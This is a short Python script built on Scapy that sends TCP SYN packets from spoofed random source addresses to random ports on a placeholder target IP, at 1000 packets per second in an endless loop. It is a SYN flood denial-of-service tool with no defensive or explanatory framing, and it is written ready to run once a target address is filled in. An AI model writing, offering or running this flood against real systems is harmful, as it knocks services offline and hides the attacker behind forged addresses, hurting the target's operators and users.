from scapy.all import *
import random

def send_packets(target_ip, packets_per_second):
    while True:
        for i in range(packets_per_second):
            packet = IP(src=RandIP(), dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")
            send(packet, verbose=False)
        time.sleep(1)


target_ip = '_your_target_ip'
packets_per_second = 1000

send_packets(target_ip, packets_per_second)